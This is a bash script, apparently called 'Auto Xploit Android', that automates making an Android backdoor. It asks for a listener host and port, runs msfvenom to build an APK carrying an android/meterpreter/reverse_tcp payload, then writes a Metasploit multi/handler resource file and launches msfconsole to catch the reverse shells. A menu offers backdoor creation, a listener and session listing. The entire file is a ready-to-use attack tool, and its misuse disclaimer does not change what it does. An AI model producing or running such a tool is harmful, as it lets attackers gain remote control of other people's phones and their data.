#!/bin/bash
# Coded by EVO , all rights reserved 
# I'm not responsible of the bad uses that people can give to this tool

clear
New_backdoor() {

	echo " 		Input the LHOST : "
	read lhost
	echo " 		Input the LPORT :"
	read lport
	echo " 		Input the name of the backdoor "
	echo " 			*remember it must end on .apk*"
	read Backdoor_name
	echo " 		Creating backdoor...."
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $Backdoor_name
	service postgresql start
	echo " 		Introduce el lhost del listener" 
	read localhost
	echo " 		Introduce el lport del listener"
	read localport
	echo "use exploit/multi/handler" >> .listener.rc
	echo "set payload android/meterpreter/reverse_tcp" >> .listener.rc
	echo "set lhost $localhost" >> .listener.rc
	echo "set lport $localport " >> .listener.rc
	echo "exploit" >> .listener.rc
	msfconsole -r .listener.rc
}

Listener(){
	echo "		Introduce el lhost del listener" 
        read localhost
        echo " 		Introduce el lport del listener"
        read localport
        echo "use exploit/multi/handler" >> .listener.rc
        echo "set payload android/meterpreter/reverse_tcp" >> .listener.rc
        echo "set lhost $localhost" >> .listener.rc
        echo "set lport $localport " >> .listener.rc
        echo "exploit" >> .listener.rc
        msfconsole -r .listener.rc
}

Sessions(){
	echo "use exploit/multi/handler" >> .handler.rc
	echo "set payload android/meterpreter/reverse_tcp" >> .handler.rc
	echo "sessions -i" >> .handler.rc
	echo "Iniciando handler..." 
	
}



echo "	 _______          _________ _______             _______  _        _______ __________________"
echo "	(  ___  )|\     /|\__   __/(  ___  )  |\     /|(  ____ )( \      (  ___  )\__   __/\__   __/"
echo "	| (   ) || )   ( |   ) (   | (   ) |  ( \   / )| (    )|| (      | (   ) |   ) (      ) (   "
echo "	| (___) || |   | |   | |   | |   | |   \ (_) / | (____)|| |      | |   | |   | |      | |   "
echo "	|  ___  || |   | |   | |   | |   | |    ) _ (  |  _____)| |      | |   | |   | |      | |   "
echo "	| (   ) || |   | |   | |   | |   | |   / ( ) \ | (      | |      | |   | |   | |      | |   "
echo "	| )   ( || (___) |   | |   | (___) |  ( /   \ )| )      | (____/\| (___) |___) (___   | |   "
echo "	|/     \|(_______)   )_(   (_______)  |/     \||/       (_______/(_______)\_______/   )_(   "
echo "                                                                                            "
echo "	 _______  _        ______   _______  _______ _________ ______                               "
echo "	(  ___  )( (    /|(  __  \ (  ____ )(  ___  )\__   __/(  __  \                              "
echo "	| (   ) ||  \  ( || (  \  )| (    )|| (   ) |   ) (   | (  \  )                             "
echo "	| (___) ||   \ | || |   ) || (____)|| |   | |   | |   | |   ) |                             "
echo "	|  ___  || (\ \) || |   | ||     __)| |   | |   | |   | |   | |                             "
echo "	| (   ) || | \   || |   ) || (\ (   | |   | |   | |   | |   ) |                             "
echo "	| )   ( || )  \  || (__/  )| ) \ \__| (___) |___) (___| (__/  )                             "
echo "	|/     \||/    )_)(______/ |/   \__/(_______)\_______/(______/                              "
                                                                 




echo " Tested on 8/9.x.x"
echo " "
echo "____________________________________________________________________________________________"
echo " ### 					OPTIONS					       ###"
echo " ##               _________________________________________________ 			##"
echo " ##		 	1) Create new backdoor and start listener  			##"
echo " ##               _________________________________________________ 			##"
echo " ##			2) Start listener 						##"
echo " ##               _________________________________________________ 			##"
echo " ##			3) Show sessions 						##"
echo " ##               _________________________________________________ 			##"
echo " ##			4) EXIT								##"
echo " ##               _________________________________________________ 			##"
read ch

case $ch in 
	1)New_backdoor ;;
	2)Listener ;;
	3)Sessions ;;
	4)exit 0;;
	*) echo " That was not any of the options... "
esac
